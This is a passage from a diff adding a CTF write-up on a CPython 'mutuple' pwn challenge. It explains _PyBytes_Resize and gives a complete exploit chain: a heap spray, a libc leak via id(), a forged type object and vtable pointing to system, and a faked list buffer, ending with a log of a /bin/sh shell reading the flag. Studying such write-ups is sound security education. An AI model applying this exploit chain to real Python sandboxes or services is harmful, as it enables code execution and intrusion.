+        return (*pv == NULL) ? -1 : 0;
+    }
+    if (Py_REFCNT(v) != 1) {
+        goto error;
+    }
+    if (newsize == 0) {
+        *pv = _PyBytes_FromSize(0, 0);
+        Py_DECREF(v);
+        return (*pv == NULL) ? -1 : 0;
+    }
+    /* XXX UNREF/NEWREF interface should be more symmetrical */
+#ifdef Py_REF_DEBUG
+    _Py_RefTotal--;
+#endif
+#ifdef Py_TRACE_REFS
+    _Py_ForgetReference(v);
+#endif
+    *pv = (PyObject *)
+        PyObject_REALLOC(v, PyBytesObject_SIZE + newsize);
+    if (*pv == NULL) {
+        PyObject_Del(v);
+        PyErr_NoMemory();
+        return -1;
+    }
+    _Py_NewReference(*pv);
+    sv = (PyBytesObject *) *pv;
+    Py_SET_SIZE(sv, newsize);
+    sv->ob_sval[newsize] = '\0';
+    sv->ob_shash = -1;          /* invalidate cached hash value */
+    return 0;
+error:
+    *pv = 0;
+    Py_DECREF(v);
+    PyErr_BadInternalCall();
+    return -1;
+}
+```
+
+This function can only be called if the bytestring has exactly 1 reference. If so, it saves some time and space by not
+reallocating a new object for the requested size, but instead updating the size of the old bytestring. This shortcut is
+quite dangerous, because we're exposing ourselves to a kind of "UAF" over here! The `Py_REFCNT(v) != 1{:c}` check is the
+only guard preventing exploits on this UAF.
+
+# Exploit
+
+With all this context in mind, let's start solving the challenge!
+
+## Getting our leaks
+
+Our primitive is an out-of-bounds write from a tuple. We can append pointers to the end of the tuple, which possibly
+overflows into the object after. First things first, let's get rid of the tuples in the freelist so we can get 2
+adjacent tuples. Then, since the tuples are allocated in the `mmap` region adjacent to libc, by leaking one of their
+addresses, we already have our libc leak.
+
+```py
+spray = []
+
+# spray some tuples so attacker and victim are adjacent
+for i in range(0x800):
+    spray.append((i,))
+
+attacker = spray[0x200]
+victim = spray[0x201]
+attacker_addr = id(attacker)
+print_(hex(attacker_addr))
+print_(hex(id(victim)))
+
+libc_base = attacker_addr + 0x5947e0
+print_(hex(libc_base))
+system = libc_base + 0x52290
+```
+
+> Note: while this leak basically comes for free, its reliability is quite low because the address of our reference
+> object can easily change in the `pymalloc` heap. To obtain a more reliable leak, one may need to get an arbitrary read
+> primitive and leak the GOT, or otherwise leak some libc addresses from the `pymalloc` heap (although that itself is
+> unreliable as well). If you have the Docker configuration, then it's not difficult to tweak the offset to obtain the
+> correct libc base.
+
+## Forging our `fakeobj`
+
+A great target for our fake object is the `ob_type{:c}` pointer. It has a lot of function pointers that we can target to
+get our RCE. Honestly, it doesn't really matter which function we overwrite, as long as the function passes in a pointer
+to something we control as the first argument, which is most of them (the first argument is almost always the `PyObject
+*{:c}` itself). I can't remember why but I chose to overwrite another vtable, the `tp_as_mapping{:c}` member. This
+member points to a vtable that looks like this:
+
+```c title="Objects/tupleobject.c"
+static PyMappingMethods tuple_as_mapping = {
+    (lenfunc)tuplelength,
+    (binaryfunc)tuplesubscript,
+    0
+};
+```
+
+As the names suggest, the 2nd pointer in this vtable is called when we index the victim obj. If we can overwrite or fake
+this, then we can set it to `system{:c}` and win!
+
+The only issue is that we don't actually have arb write over the heap. Instead, we can only place object pointers on the
+heap. To write arbitrary data to the heap, we can use a bytestring, but we won't have direct pointers to the fake
+content in the bytestring (we can only reference the bytestring at the header, so our fake content is 0x20 bytes after
+our bytestring pointer). The challenge here is, how do we create a direct reference to our forged object in the
+bytestring, since we can't place arbitrary addresses on the heap?
+
+The answer is to use list indexing. If we have a list on the heap, and we overwrite the backing buffer pointer to a
+bytestring, then we can access an arbitrary pointer at +0x20 (which is the 5th index of the victim list). This pointer
+can point to the start of our actual fake object.
+
+> This is actually more convoluted than needed; there are probably much easier ways to solve the challenge. But since I
+> wanted to have fun in this exploit, I tried to play around with Python types more.
+
+First, create the fake vtable with our system pointer:
+
+```py
+payload_4 = bytes([i for i in ((system >> j * 8) & 0xff for j in range(8))])
+fake_vtable = id(payload_4) + 0x20 - 0x8
+```
+
+Then create the fake type, taking care to set some of the important fields so we
+don't crash pre-maturely:
+
+```py
+payload_1 = b"\x50" + b"\x00"*7 # type->refcount
+payload_1 += b"\x80\x87\x90" + b"\x00"*5 # type->type
+payload_1 += b"\x00" * 8
+payload_1 += b"\xa3\x23\x7e" + b"\x00" * 5 # type->name
+payload_1 += b"\x18" + b"\x00" * 7 # type->size
+payload_1 += b"\x08" + b"\x00" * 7 # type->element_size
+payload_1 += b"\x00" * 8 # type->tp_dealloc
+payload_1 += b"\x00" * 8 # type->tp_vectorcall_offset
+payload_1 += b"\x00" * 8 # type->tp_getattr
+payload_1 += b"\x00" * 8 # type->tp_setattr
+payload_1 += b"\x00" * 8 # type->tp_as_async
+payload_1 += b"\x00" * 8 # type->tp_repr
+payload_1 += b"\x00" * 8 # type->as_number
+payload_1 += b"\x00" * 8 # type->as_sequence
+payload_1 += bytes([i for i in ((fake_vtable >> j * 8) & 0xff for j in range(8))]) # type->as_mapping
+
+fake_type = id(payload_1) + 0x20
+print_(hex(fake_type))
+```
+
+Next, create a fake object that uses our fake type:
+
+```py
+payload_2 = b".bin/sh\x00" # refcount will increase by one changing . to /
+payload_2 += bytes([i for i in ((fake_type >> j * 8) & 0xff for j in range(8))])
+print_(payload_2)
+fake_obj = id(payload_2) + 0x20
+print_(hex(fake_obj))
+```
+
+And finally, create a list element slot by making a pointer to the fake object's
+pointer. This prepares `payload_3` to be the backing buffer containing a pointer
+to the fake object.
+
+```py
+payload_3 = bytes([i for i in ((fake_obj >> j * 8) & 0xff for j in range(8))])
+```
+
+Now, we can take advantage of the primitive to get RCE, by overwriting the victim tuple's type to list, and its backing
+buffer to the fake backing buffer. Note that the `refcount{:c}`, `length{:c}`, and `capacity{:c}` members aren't
+actually the values 0x2 and 0x10; they are just the addresses of these values.
+
+```py
+append(attacker, 0x1)
+append(attacker, 0x1)
+append(attacker, 0x2) # victim->refcount
+append(attacker, type([])) # victim->type
+append(attacker, 0x2) # victim->length
+append(attacker, payload_3) # victim->elements
+append(attacker, 0x10) # victim->capacity
+
+victim[4]["oops"]
+```
+
+Exploit in action:
+
+```ansi
+[1m[32m●[0m [36mctf/my-challs/submitted/mutuple/solve[39m
+[36m$[39m [38;5;14m: [36mpython3[39m [1m[32msend.py[0m
+[[1m[32m+[0m] Opening connection to localhost on port 5000: Done
+[[1m[34m*[0m] Switching to interactive mode
+ 0x7aaf434f2820
+0x7aaf434f2850
+0x7aaf43a87000
+0x7aaf435caa50
+b'.bin/sh\x00P\xaa\\C\xafz\x00\x00'
+0x7aaf4366d050
+[1m[31m$[0m ls
+flag.txt
+run.py
+server.py
+[1m[31m$[0m cat flag.txt
+sctf{ther3s_mulTUPLE_w4ys_t0_s0lve_th15_ch4ll_xD_xD_xD_im_s0_funny_heheh3h4_tupl3_Tup73
+_tup1e_Tupl3_tuple}
+```
+
+---
+
+This was quite a fun intro to CPython pwn for me. Hope to make more such
+challenges (and posts) soon!
